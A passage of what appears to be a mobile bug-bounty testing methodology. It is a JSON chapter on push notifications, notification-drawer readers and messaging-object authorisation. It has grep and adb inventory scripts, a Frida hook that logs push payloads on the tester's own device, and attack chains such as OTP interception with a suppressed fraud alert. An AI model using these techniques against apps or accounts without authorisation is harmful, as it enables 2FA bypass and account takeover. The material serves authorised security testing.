@@ -1,0 +1,2982 @@
+{
+ "id": "D24",
+ "name": "Push, Notifications & Messaging",
+ "file": "D24-push-notifications-messaging.md",
+ "why": "It pays because it is where **AM-01 lives on a mobile app**. Every other chapter needs an installed app\n(AM-03), a tapped link (AM-02) or a network position; a push handler is reached by whoever can make the\nbackend, the push provider or a leaked send credential emit a message, and a chat renderer is reached by\nany account that can type. The two platform facts that decide the ceiling: (1) a push provider's\n`subscribeToTopic()`-style call is a **client-side** request with no server-side authorisation, so a topic\nname derived from a user or order id is readable by every install of the app; (2) the legacy server-key\nsend endpoint was retired by the provider in 2024, so the credential class that sends to the whole install\nbase is now a service-account or vendor REST key (D18-032, D24-017) — a stronger secret, more often\nshipped in a config file, and never needed by the client.\n\nIt pays a second time because the drawer is a **data sink with four readers**: the lock screen (Android's\n`VISIBILITY_*` model), notification history (retained after dismissal since Android 11), any\n`NotificationListenerService` the user ever granted, and companion devices. Android 15's OTP redaction\ncloses exactly one of those four, for exactly one content class, and only for listeners the platform\ncalls untrusted — the delivery shapes that route around it are catalogued in D22-047. Banking-trojan\ntradecraft (ATT&CK T1517, T1582) is built on the readers that remain.\n\nIt pays a third time on the **messaging objects behind the UI**. Messages, attachments, reactions,\nmentions, polls, call logs and link previews are each an object with its own id space and its own\nauthorisation check, usually written by a different team from the one that wrote the conversation check.\nThe report classes with the highest acceptance rates in this domain are all backend: cross-account read or\nedit of a message or attachment by id, a CDN attachment URL that outlives deletion, a server-side link\npreviewer that fetches internal addresses, and a push-token registration that accepts another user's\nidentifier.\n\nBe honest about the floor. Notification content visible to the push provider, \"notifications are not\nend-to-end encrypted\", notification spam without an authorisation bypass, and a crash from a malformed\npayload are **P5 or ineligible on every mainstream programme**. Lead with the action — the OTP that\narrived on the wrong device, the route that opened, the message that changed — never with the transport.",
+ "crux": "Can a party who is not the victim — a second account, an unauthenticated request, a leaked send credential, or an app with notification access — cause content to be delivered to, rendered by, or acted upon in the victim's client, and does the client or backend treat that content as more trusted than the party who supplied it?",
+ "applicability": "Run these four groups from `$E` with `M=$DEC/apktool/AndroidManifest.xml`, `S=$DEC/jadx/sources`, `PKG`\nset to the package and `SERIAL` set to the device (`export SERIAL=emulator-5554`; never `-U`). Record\nevery count in `logs/D24-probe.txt` — print the number, never eyeball the list. Group 4 needs a positive\ncontrol: drive one flow that is expected to post a notification before you count.\n\n```bash\nM=$DEC/apktool/AndroidManifest.xml; S=$DEC/jadx/sources\n# 1. push transport present? (FCM/c2dm, HMS, and the vendor SDKs that wrap or replace them)\ngrep -cE 'com\\.google\\.firebase\\.MESSAGING_EVENT|com\\.google\\.android\\.c2dm|com\\.huawei\\.hms\\.push|onesignal|braze|clevertap|urbanairship|moengage|pushwoosh|airship' \"$M\"\n# 2. notification, listener and full-screen code present?\ngrep -rlE 'NotificationCompat|Notification\\.Builder|RemoteInput|NotificationListenerService|setFullScreenIntent|ProgressStyle|setRequestPromotedOngoing' \"$S\" | wc -l\n# 3. SMS / RCS / messaging roles and permissions\ngrep -cE 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE|ROLE_SMS|android\\.permission\\.(READ|RECEIVE|SEND)_SMS|SmsRetriever|ImsRcs|RcsUce' \"$M\"\ngrep -rlE 'SmsManager|sendTextMessage|sendMultipartTextMessage|content://sms|Telephony\\.Sms' \"$S\" | wc -l\n# 4. live: does the installed app post anything at all? (trigger one notification first)\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -c \"pkg=$PKG\"\n# 5. messaging feature? (conversation/message objects in the endpoint map)\ngrep -ciE 'message|conversation|chat|thread|attachment' inventory/endpoints.csv\n```\n\nDecision rules and the exact `notes` text:\n\n- 1 = 0 **and** 3 = 0 (both lines) **and** 4 = 0 **and** 5 = 0 → the whole domain is n/a. Write:\n  `n/a — D24: no push transport (0 messaging-event filters), no SMS/RCS role, permission or API (0/0), app posts no notification after a triggered flow (dumpsys 0), no messaging objects in the endpoint map (0); probe on <date>, <apk sha256 prefix>`. Keep D24-028 open when 2 > 0 and the hit is `NotificationListenerService`.\n- 1 = 0 but 4 > 0 → the notification-trust block applies (D24-022..031); mark D24-007..021 `n/a — D24: no push transport in the manifest (probe 1 = 0)` and set `engagement.json.app_facts.push=false`.\n- 1 > 0 → set `engagement.json.app_facts.push=true`; D24-007..021 apply in full and the `push` tag is live.\n- 3 = 0 on both lines → `n/a — D24-032..035: no SMS role, permission or SmsManager call site in $DEC`.\n- 5 = 0 after the endpoint map is complete (P3 gate passed) → `n/a — D24-036..049: no message, conversation or attachment object in inventory/endpoints.csv`; otherwise the messaging block applies and needs two accounts (`blocked — D24-036..049 need account B` until `accounts` lists one).\n- `adb -s \"$SERIAL\" shell id` must print `uid=2000(shell)` before any reachability oracle in this chapter is trusted; the root harness in D24-002/004 is a *payload* harness, not a reachability proof.",
+ "triage": "1. **Send credentials in the package and in older builds (D24-017; D18-031/032 for the first-party\n   provider).** One grep and one benign send to your own token. This is the domain's only routine path\n   to P1 without a second account.\n2. **Topic and channel subscriptions derived from an id (D24-010, D24-048).** A Frida hook on the\n   subscribe call plus one self-subscription to a sibling id. Cheap, and it is where OTPs and order\n   events leak at scale.\n3. **Registration and device endpoints (D24-007..009).** Two accounts, one proxy. Re-pointing a\n   victim's token to your device is the push-side account takeover.\n4. **What the handler does with the payload (D24-013..016, D24-020).** Read `onMessageReceived` and\n   the SDK's notification parser to their sinks before you spend time on sending. A handler that only\n   posts text caps the whole push block at Medium.\n5. **Any route that lets one user send free text to another (D24-011, D24-040, D24-041).** The\n   remote renderer: HTML, markdown, mentions, auto-handled links.\n6. **The message-object matrix (D24-036..038, D24-044).** Mechanical, two accounts, high acceptance.\n   Run it as a table, not as a tour.\n7. **The drawer readers (D24-012, D24-024, D24-026, D24-028, D24-031).** Lock screen, history,\n   listener, companion. Settle the OTP question with D13-048 and D22-047 open beside you.\n8. **Lock-screen and full-screen surfaces (D24-022, D24-023, D24-047).** Remote text over the keyguard\n   and approvals from a locked phone.\n9. **SMS, RCS and native parsers (D24-032..035, D24-046).** Toll fraud from an exported surface is\n   quick to settle; parser work is a D16 hand-off and is last.",
+ "graveyard": "| Observation | Why it is not a finding | What would make it one |\n|---|---|---|\n| The push provider (or its dashboard) can read notification payloads | The provider is the app's trusted delivery infrastructure; \"the vendor sees the data it delivers\" is its documented trust model, and no programme rates a third party's design as the app's bug. | The payload carries a value the app's own policy says never leaves the backend (an OTP, a card number) **and** a reader the app does not control sees it on the device (D24-012) — rate on the reader, not on the provider. |\n| \"Push messages are not end-to-end encrypted\" | Same trust model; the transport is TLS to the provider and TLS to the device. | A sensitive value in the payload reaches history, a listener or the keyguard (D24-012), or a cleartext fetch of rich media exists (D24-015). |\n| A route lets one user send many notifications to another | `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam` is P5. | The same route takes free text or a deep link (D24-011), reaches a blocked user (D24-049), or has no throttle on an SMS send that costs the vendor money (D13-047 — the `sms_triggering` node is P4). |\n| The handler crashes on a malformed payload | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is P5; a crash alone is excluded by most programmes. | The crash persists across restart (the message is re-delivered on every launch), or the input reaches a decoder with a memory-safety sink (D24-015, D24-046 → D16). |\n| The app's push receiver is `exported=\"true\"` | The provider's receive action is a protected delivery contract guarded by a signature permission; the export is required. | The signature permission is missing or the messaging service is exported (D05-025 oracle: the unrooted probe's send is not refused). |\n| The legacy server key is in the APK but the legacy send endpoint rejects it | The provider retired the legacy HTTP API; a 401 there proves the endpoint is closed, not that the credential is harmless. | The same project's service-account JSON is in the package (D18-032), or a vendor REST credential sends (D24-017). |\n| The client subscribes to topics | Topic subscription is the provider's documented feature. | The topic name is derived from a user, order or tenant id and a sibling subscription delivers another user's content (D24-010). |\n| Notifications show full content on the lock screen | The user chose `VISIBILITY_PUBLIC` in Settings, or the app's default is public for a non-sensitive channel. | The channel carries an OTP, balance or message body with `VISIBILITY_PUBLIC` as the app's default and no `setPublicVersion` (D20-030), or the payload picks the public channel (D24-026). |\n| A notification listener can read the app's notifications | The listener grant is a user decision; every app's notifications are readable by a granted listener. | The app puts a secret or a one-time token in the extras (D24-012, D24-031), ships a `content://` URI the listener gains a grant on (D24-025), or exposes an approval action (D24-047). |\n| \"The app has no `POST_NOTIFICATIONS` runtime prompt\" / the user can decline alerts | A platform permission model, not an app defect. | Security alerts have no other delivery channel and the takeover becomes silent (D22-019), or the app uses a call-style exemption to post anyway (D22-020). |\n| SMS OTP is sent in plaintext over the carrier network | Carrier transport is out of scope everywhere; SMS is the user's chosen factor. | The app reads more than the OTP (D24-034), or the OTP is reachable on the device by a weaker principal (D13-048). |\n| Carrier or RCS verified-sender spoofing | A carrier and messaging-platform problem; the app did not write the sender badge. | The app's own business-messaging backend lets the client choose the sender identity (D24-035). |\n| A received link opens in the system browser | That is the safe behaviour. | The link is handled in-app as a deep link or in the session WebView without the browser path's checks (D24-041). |\n| A received image is saved to the gallery | Expected for a messaging app the user configured to auto-save. | EXIF location survives, or the file lands in a collection other apps read without the user's export choice (D24-039). |\n| Message ids are UUIDs, so the IDOR is \"AC:H\" | The HackerOne standard does set `AC:H` on an unleaked v4 UUID. | The id leaks elsewhere (D15-039, D15-058) — then the same bug is two VRT bands higher. |\n| The self-sent canary from the root harness reached the handler | A root broadcast (D24-004 harness) bypasses the signature permission; it proves what the handler does, not who can reach it. | The same payload is delivered through a route in the D24-003 table, a recovered credential (D24-017), a topic (D24-010) or an exported SDK component (D24-019). |\n| Reproduced only with the client's recovered send credential against the tester's own device | That is the D24-017 proof, correctly bounded. Sending to anyone else, a segment or a topic is a programme violation, not evidence. | Nothing — stop at the benign own-device send and file. |",
+ "joins": "- **D05 ordered-broadcast interception × D13 OTP pipeline × D24 push.** On API <= 35, intercept the\n  ordered broadcast carrying the code (D05-036), `abortBroadcast()` the fraud alert that would have warned\n  the user, and replay the code — three surfaces owned by three different reviewers, and the chain is a\n  2FA bypass with a suppressed alarm. The D24 half is the alert's delivery: a notification the victim never\n  saw (D22-019 makes it silent on a fresh install anyway).\n- **D08 × D24 — the notification drawer is the PendingIntent acquisition layer.** The PendingIntent\n  reviewer reads the builder (D08-037, D08-044); the notification reviewer reads the content. The join is a\n  `NotificationListenerService` that harvests `contentIntent` / `actions[i].actionIntent` and re-sends\n  them (D08-040): a mutable PendingIntent built from a payload field (D24-020) becomes a confused deputy\n  with a working acquisition path, and an approval action (D24-047) becomes an approval the listener can\n  fire.\n- **D09 × D24 — the notification-trust routes.** Routes gated on \"this came from a notification\" are\n  gated on a signature whose key is often in the APK (D09-039), so a push-origin route is trusted more than\n  the same URI from a browser (D24-013). Joined the other way, a listener reads the deep link **and its\n  one-time token** out of the extras and replays the route itself (D24-031). The push team and the router\n  team each assume the other validates.\n- **D13 × D24 — the OTP pipeline and listener redaction.** D13-048 tests the four on-device OTP readers;\n  Android 15 redacts one of them for one content class. D24 adds the delivery shapes that route around\n  it — the OTP in a push payload rather than an SMS (D24-012), on a public channel chosen by the sender\n  (D24-026), on a companion (D24-024), in a topic any install can subscribe to (D24-010) — and the\n  approval prompt that replaces the OTP altogether (D24-047). Settle the OTP question with both chapters\n  open.\n- **D15 × D24 — push payload × backend action.** A data message that names an object id turns the\n  victim's client into the attacker's HTTP client with the victim's session (D24-016); the backend IDOR\n  (D15) and the client's trust in the payload are two halves of one report, filed per D24-052. The\n  registration and topic routes (D15-055, D15-056) are the backend statements whose on-device proof lives\n  here (D24-007, D24-010).\n- **D20 × D24 — sensitive content in notifications.** D20-030..035 settle what the drawer shows and to\n  whom; D24 settles what the sender can put there and which reader sees it: the payload value (D24-012),\n  the channel the payload selects (D24-026), the promoted surface on the always-on display (D24-023), the\n  companion (D24-024). One canary OTP, posted once, answers both chapters if each reader is checked in the\n  same trial.\n- **D16 × D24 — zero-click delivery.** A push's big-picture URL (D24-015), a received sticker or voice\n  note (D24-046) and an MMS part under the SMS role (D24-033) each reach a decoder in the app's process\n  with no tap. The native reviewer finds the bug; this chapter names the trigger context, which is what\n  decides the multiplier.\n- **D23 × D24 — entitlement refresh by push.** Entitlement state refreshed by a push-triggered broadcast\n  or data message (D23-017) is assertable by whoever can send the message (D24-003) and repeatable when\n  the handler does not dedupe (D24-021).\n- **D11 × D24 — media and message stores.** Received media in shared collections (D24-039) is the D11\n  MediaStore question with a remote sender choosing the bytes and, through D11-045, the filename; the\n  message store in a backup set (D24-043) is D11-055's second plaintext copy.",
+ "sources": "- OWASP MASTG/MASVS/MASWE: MASTG-TEST-0315 (sensitive data exposed via notifications), -0318 and -0319\n  (SDK APIs handling sensitive data), -0381 (insecure PendingIntent creation), -0394 (custom URL scheme\n  input validation), -0398 and -0400 (WebViewClient URL loading handlers), -0200 (files written to\n  external storage), -0216 (backup exclusion), -0235 and -0236 (cleartext), -0366 (exported receivers);\n  MASTG-TECH-0043, -0162, -0164, -0172, -0173, -0127; MASTG-KNOW-0054 (app notifications), -0024\n  (pending intents), -0019 (deep links), -0018 (WebViews), -0026 (third-party services), -0138 (URI\n  schemes in intent results); MASTG-BEST-0063, -0071, -0035; MASTG-DEMO-0078, -0147, -0130;\n  MASTG-TOOL-0031 (Frida), -0097 (mitmproxy), -0125 (apkleaks); rules\n  `mastg-android-sensitive-data-in-notifications`, `mastg-android-pendingintent-mutable`,\n  `mastg-android-deeplink-unvalidated-parameter`; MASWE-0004, -0006, -0018, -0023, -0024, -0026, -0029,\n  -0032, -0033, -0035, -0036, -0037, -0044, -0050, -0069, -0073; MASVS-PLATFORM-1/2/3, MASVS-AUTH-1,\n  MASVS-NETWORK-1, MASVS-PRIVACY-1, MASVS-CODE-4.\n- Android platform documentation: `develop/ui/views/notifications` (channels, visibility,\n  `setPublicVersion`, `setLocalOnly`, `MessagingStyle`, full-screen intents, call style), the Android 11\n  notification history, Android 12 notification-trampoline restriction, Android 13 `POST_NOTIFICATIONS`\n  and dismissable foreground-service notifications, Android 14 `USE_FULL_SCREEN_INTENT` restriction,\n  Android 15 sensitive-notification (OTP) redaction for untrusted listeners and Private Space, Android 16\n  Live Updates (`Notification.ProgressStyle`, promoted ongoing notifications — verify names on the\n  installed platform); `reference/android/service/notification/NotificationListenerService`;\n  `reference/android/telephony/SmsManager`; the default-SMS-app contract (`SMS_DELIVER`,\n  `WAP_PUSH_DELIVER`, `RESPOND_VIA_MESSAGE`); `guide/topics/manifest/receiver-element`\n  (`android:directBootAware`); the risk articles `insecure-broadcast-receiver`, `pending-intent`,\n  `intent-redirection`, `unsafe-deep-link`.\n- Push provider documentation: the messaging SDK's distinction between notification messages (posted by\n  the SDK when the app is backgrounded; data keys delivered as launcher-activity extras) and data messages\n  (always handed to the handler); topic subscription as a client call; the retirement of the legacy\n  server-key HTTP API in favour of the OAuth2 HTTP v1 API with service-account credentials; the\n  `c2dm.permission.SEND` signature permission on the receive receiver; at-least-once delivery and\n  collapse keys. Engagement-SDK documentation for each vendor present: which identifier is client-safe\n  and which credential is server-only.\n- Bugcrowd VRT release 2026-07-08: `broken_access_control.idor.*`, `.privilege_escalation`,\n  `.username_enumeration.non_brute_force`; `broken_authentication_and_session_management.authentication_bypass`,\n  `.two_fa_bypass`, `.failure_to_invalidate_session.on_logout`;\n  `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`, `.pii_leakage_exposure`,\n  `.data_traffic_spam` (P5), `.pay_per_use_abuse`; `cross_site_scripting_xss.stored.non_admin_to_anyone`;\n  `server_security_misconfiguration.server_side_request_forgery_ssrf.*`,\n  `.no_rate_limiting_on_form.sms_triggering`; `server_side_injection.content_spoofing.*`;\n  `insufficient_security_configurability.lack_of_notification_email` (P5),\n  `.weak_two_fa_implementation.missing_failsafe`; `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5);\n  `mobile_security_misconfiguration.auto_backup_allowed_by_default` (P5);\n  `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage`;\n  `sensitive_data_exposure.exif_geolocation_data_not_stripped_from_uploaded_images.*`.\n- MITRE ATT&CK Mobile: T1517 Access Notifications; T1582 SMS Control; T1636.004 SMS Messages; T1660\n  Phishing; T1655 Masquerading; T1643 Generate Traffic from Victim; T1635 Steal Application Access Token;\n  T1437.001 Web Protocols; T1541 Foreground Persistence; T1624.001 Broadcast Receivers.\n- Report classes (no ids cited — see `docs/02`): cross-account message and attachment IDOR in chat\n  features; push-token registration accepting another user's identifier; per-user topic subscription;\n  stored XSS in message rendering; server-side link-preview SSRF; notification-listener OTP theft as\n  banking-trojan tradecraft; vendor REST send credentials in client packages; \"delete for everyone\"\n  unenforced server-side; blocked-user bypass via reactions and groups.\n- Tooling: Frida (`frida -D \"$SERIAL\"`, `frida/01-webview-settings.js`, `frida/02-bridge-enum.js`,\n  `frida/03-deeplink-trace.js`), mitmproxy with WebSocket view, `adb shell dumpsys notification\n  --noredact`, `adb shell cmd notification post`, `adb shell appops get`, `tools/02-component-sweep.sh`,\n  `tools/05-storage-sweep.sh --backup`, the `attacker-app/` probe for AM-03, `exiftool`, a Wear or\n  companion emulator, a second AVD or handset for account B.\n- Bug-hunting methodology corpus (the layer-ordering trap, the Body-Diff Rule, the Shell-Loop Ban, the\n  Pre-Severity Gate, chain-filing order), applied here as D24-004/005/006/052.",
+ "intro": "> Push is the one channel through which a remote attacker can put bytes **inside the app's process with no tap** — and the notification drawer is the one place where those bytes are rendered under the vendor's icon, on the lock screen, to every listener the user ever granted. Messaging features add a second remote channel: anything another account can type, attach or link is parsed by the victim's client. This chapter owns the whole pipeline — who can cause a message to reach a victim, what the handler does with it, what the drawer shows, and what the chat objects behind it authorise — and rates every finding on the **action the payload drives**, never on the transport.\n\n| | |\n|---|---|\n| **Phases** | P4 static deep review (handler, notification builder, SDK receivers, message renderers); P6 network/API (registration, topics, send routes, message-object authorisation, link previews); the locally-reachable halves are proved in P5 from the probe app (owner D05) |\n| **Milestones** | M4, M6 |\n| **VRT ceiling** | Critical — `broken_authentication_and_session_management.authentication_bypass` (P1) when a push-delivered OTP or approval lands on an attacker's device (D24-010, D24-047); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a send credential in the package (D24-017); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for the message-object matrix (D24-036). The routine ceiling is P2: `cross_site_scripting_xss.stored.non_admin_to_anyone` for rendered messages and `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` for token re-pointing. There is no notification-specific VRT node; the two nodes that name notifications (`insufficient_security_configurability.lack_of_notification_email`, `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam`) are both P5. |\n| **Primary attacker model** | AM-01 (a request or a push, no interaction) for the send and registration routes; AM-05 (a second account) for every messaging object; AM-04 (one granted special access: notification listener) for the drawer; AM-03 only where a push-SDK component is locally reachable (owner D05-025). |\n| **Maps to** | MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-AUTH-1, MASVS-NETWORK-1, MASVS-PRIVACY-1, MASVS-CODE-4; MASTG-TEST-0315, MASTG-TEST-0318, MASTG-TEST-0319, MASTG-TEST-0381, MASTG-TEST-0394, MASTG-TEST-0398, MASTG-TEST-0400, MASTG-TEST-0200, MASTG-TEST-0216; MASTG-TECH-0043, MASTG-TECH-0162, MASTG-TECH-0164, MASTG-TECH-0173; MASTG-KNOW-0054, MASTG-KNOW-0024, MASTG-KNOW-0019, MASTG-KNOW-0026; MASTG-BEST-0063, MASTG-BEST-0071; MASTG-DEMO-0078, MASTG-DEMO-0147; MASTG-TOOL-0031, MASTG-TOOL-0097; MASWE-0004, MASWE-0018, MASWE-0024, MASWE-0026, MASWE-0029, MASWE-0032, MASWE-0033, MASWE-0035, MASWE-0037, MASWE-0050, MASWE-0069, MASWE-0073; CWE-862, CWE-639, CWE-798, CWE-79, CWE-918, CWE-319, CWE-200, CWE-294, CWE-925, CWE-926, CWE-20; ATT&CK T1517, T1582, T1636.004, T1660, T1655, T1643, T1635, T1437.001 |",
+ "domain_meta": {
+  "Phases": "P4 static deep review (handler, notification builder, SDK receivers, message renderers); P6 network/API (registration, topics, send routes, message-object authorisation, link previews); the locally-reachable halves are proved in P5 from the probe app (owner D05)",
+  "Milestones": "M4, M6",
+  "VRT ceiling": "Critical — `broken_authentication_and_session_management.authentication_bypass` (P1) when a push-delivered OTP or approval lands on an attacker's device (D24-010, D24-047); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a send credential in the package (D24-017); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for the message-object matrix (D24-036). The routine ceiling is P2: `cross_site_scripting_xss.stored.non_admin_to_anyone` for rendered messages and `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` for token re-pointing. There is no notification-specific VRT node; the two nodes that name notifications (`insufficient_security_configurability.lack_of_notification_email`, `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam`) are both P5.",
+  "Primary attacker model": "AM-01 (a request or a push, no interaction) for the send and registration routes; AM-05 (a second account) for every messaging object; AM-04 (one granted special access: notification listener) for the drawer; AM-03 only where a push-SDK component is locally reachable (owner D05-025).",
+  "Maps to": "MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-AUTH-1, MASVS-NETWORK-1, MASVS-PRIVACY-1, MASVS-CODE-4; MASTG-TEST-0315, MASTG-TEST-0318, MASTG-TEST-0319, MASTG-TEST-0381, MASTG-TEST-0394, MASTG-TEST-0398, MASTG-TEST-0400, MASTG-TEST-0200, MASTG-TEST-0216; MASTG-TECH-0043, MASTG-TECH-0162, MASTG-TECH-0164, MASTG-TECH-0173; MASTG-KNOW-0054, MASTG-KNOW-0024, MASTG-KNOW-0019, MASTG-KNOW-0026; MASTG-BEST-0063, MASTG-BEST-0071; MASTG-DEMO-0078, MASTG-DEMO-0147; MASTG-TOOL-0031, MASTG-TOOL-0097; MASWE-0004, MASWE-0018, MASWE-0024, MASWE-0026, MASWE-0029, MASWE-0032, MASWE-0033, MASWE-0035, MASWE-0037, MASWE-0050, MASWE-0069, MASWE-0073; CWE-862, CWE-639, CWE-798, CWE-79, CWE-918, CWE-319, CWE-200, CWE-294, CWE-925, CWE-926, CWE-20; ATT&CK T1517, T1582, T1636.004, T1660, T1655, T1643, T1635, T1437.001"
+ },
+ "items": [
+  {
+   "id": "D24-001",
+   "domain": "D24",
+   "title": "Build the push, notification and messaging inventory before testing anything",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — enabler for every item in this chapter",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "All — a chapter with no inventory row produces no defensible negative",
+   "requires": "—",
+   "requires_tags": [
+    "—"
+   ],
+   "maps_to": "MASTG-TEST-0318 (references to SDK APIs known to handle sensitive data), MASTG-TECH-0162, MASTG-KNOW-0026, MASTG-KNOW-0054",
+   "record": "`inventory/push.csv`; `logs/D24-001.txt`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-KNOW-0026",
+     "MASTG-KNOW-0054",
+     "MASTG-TECH-0162",
+     "MASTG-TEST-0318"
+    ],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D05-025",
+    "D24-003",
+    "D24-019",
+    "D24-026"
+   ],
+   "domain_refs": [
+    "D05"
+   ],
+   "has_code": true,
+   "skip_when": "",
+   "test": "Produce one table with a row per push transport, messaging-service subclass, SDK receiver /\nservice / activity, notification channel, `RemoteInput` action, full-screen or call-style use, listener\nservice, and SMS/RCS role. Every downstream item indexes off this table, and D24-003 joins it to the\nendpoint map.",
+   "how": "```bash\nM=$DEC/apktool/AndroidManifest.xml; S=$DEC/jadx/sources; mkdir -p inventory\n{\n  echo 'kind,class_or_id,exported,permission,source'\n  grep -B3 -A8 -E 'MESSAGING_EVENT|c2dm\\.intent\\.RECEIVE|hms\\.push|NOTIFICATION_OPENED|NOTIFICATION_DISMISSED' \"$M\" \\\n    | grep -oE '(receiver|service|activity) android:name=\"[^\"]+\"|android:exported=\"[a-z]+\"|android:permission=\"[^\"]+\"' \\\n    | paste -sd' ' - | sed 's/^/manifest,/'\n  grep -rlE 'extends (FirebaseMessagingService|HmsMessageService)|onMessageReceived\\(' \"$S\" | sed 's/^/handler,/'\n  grep -rhoE 'NotificationChannel\\(\"[^\"]+\"|createNotificationChannel\\([^)]*\\)' \"$S\" | sort -u | sed 's/^/channel,/'\n  grep -rlE 'RemoteInput\\.Builder|setFullScreenIntent|CallStyle|setRequestPromotedOngoing|ProgressStyle' \"$S\" | sed 's/^/surface,/'\n  grep -rlE 'extends NotificationListenerService' \"$S\" | sed 's/^/listener,/'\n  grep -oE 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE|ROLE_SMS' \"$M\" | sort -u | sed 's/^/sms-role,/'\n} | tee inventory/push.csv | tee logs/D24-001.txt | wc -l\n```\nAdd one row per push-SDK vendor whose package prefix appears in `$S` (`onesignal`, `braze`, `clevertap`,\n`moengage`, `pushwoosh`, `urbanairship`, `airship`, `huawei.hms.push`) with the receiver and service\nnames their manifest fragment merged in.",
+   "proof": "`inventory/push.csv` exists with counts per kind printed in `logs/D24-001.txt`; a zero row\ncount for a kind is a recorded fact, not an omission.",
+   "escalation": "Feeds D24-003 (route → recipient), D24-019 (SDK components), D24-026 (channels) and\nD05-025 (the FCM receiver's local reachability).",
+   "ruled_out_when": "Not applicable — the inventory is produced or the chapter is not started. A table\nwith a `handler` row and no `manifest` row means the SDK's manifest fragment did not decode; re-run\napktool on the merged base APK before continuing."
+  },
+  {
+   "id": "D24-002",
+   "domain": "D24",
+   "title": "Capture one real push end to end on your own token and record the payload grammar",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — positive control for the push block",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Every app with a push transport (probe group 1 > 0)",
+   "requires": "push, device, frida",
+   "requires_tags": [
+    "push",
+    "device",
+    "frida"
+   ],
+   "maps_to": "MASTG-TECH-0043 (method hooking), MASTG-TOOL-0031, MASTG-KNOW-0054",
+   "record": "`logs/D24-002.txt` (hook output with every key the handler read); `logs/D24-002-dumpsys.txt`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-KNOW-0054",
+     "MASTG-TECH-0043",
+     "MASTG-TOOL-0031"
+    ],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D24-007",
+    "D24-013",
+    "D24-020",
+    "D24-026"
+   ],
+   "domain_refs": [],
+   "has_code": true,
+   "skip_when": "`grep -c 'MESSAGING_EVENT\\|c2dm\\|hms.push' \"$DEC/apktool/AndroidManifest.xml\"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-002: no push transport (probe 1 = 0)`.",
+   "test": "You cannot rate payload handling until you have seen one real payload: which keys the\nbackend sends, whether it uses notification messages (the SDK posts the drawer entry itself when the app\nis backgrounded and the handler never runs) or data messages (the handler always runs), and which keys\nthe handler actually reads. This is the grammar every later self-sent message must follow.",
+   "how": "```bash\nmkdir -p \"$E/frida\"; cat > \"$E/frida/d24-002.js\" <<'JS'\nJava.perform(function () {\n  var RM = Java.use('com.google.firebase.messaging.RemoteMessage');\n  RM.getData.implementation = function () {\n    var d = this.getData(); console.log('[D24-002] data=' + d.toString()); return d;\n  };\n  var B = Java.use('android.os.BaseBundle');\n  B.getString.overload('java.lang.String').implementation = function (k) {\n    var v = this.getString(k); if (k.indexOf('gcm.n.') === 0 || k === 'from' || k === 'google.message_id') console.log('[D24-002] bundle ' + k + '=' + v); return v;\n  };\n});\nJS\nfrida -D \"$SERIAL\" -n \"$PKG\" -l \"$E/frida/d24-002.js\" -q -t 600 | tee \"$E/logs/D24-002.txt\"\n# now trigger a real push to YOUR OWN account from the product (an order, a message from account B, a login alert)\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -A12 \"pkg=$PKG\" | tee \"$E/logs/D24-002-dumpsys.txt\"\n```\nHook the app's own `onMessageReceived` override (class from `inventory/push.csv`) the same way and log\nevery `getData().get(\"…\")` key it reads; the `gcm.n.*` key family is what the SDK's notification parser\nreads when the backend sends a notification message.",
+   "proof": "`logs/D24-002.txt` holds at least one `[D24-002] data=` line from a push the backend sent,\nand the key list the handler read; `logs/D24-002-dumpsys.txt` shows the posted entry with its channel.",
+   "escalation": "The key list is the input to D24-013..016 and D24-020; the channel id feeds D24-026.",
+   "ruled_out_when": "Not applicable — if no push can be made to arrive on your own account after\nexercising every notifying flow, record `blocked — D24-002: no push reached the device in <n> flows;\ntoken registered = <yes/no> (D24-007)` and keep the handler items static-only."
+  },
+  {
+   "id": "D24-003",
+   "domain": "D24",
+   "title": "Map who can cause a push to the victim: route → recipient selector table",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — the attacker-model decision for every push finding",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01 / AM-05",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "Every app with a push transport and a backend in scope",
+   "requires": "push, backend-api",
+   "requires_tags": [
+    "push",
+    "backend-api"
+   ],
+   "maps_to": "MASTG-KNOW-0026; CWE-862",
+   "record": "`logs/D24-003.txt` (the table); `inventory/endpoints.csv` rows tagged `push-trigger`",
+   "legacy_meta": {},
+   "ids": {
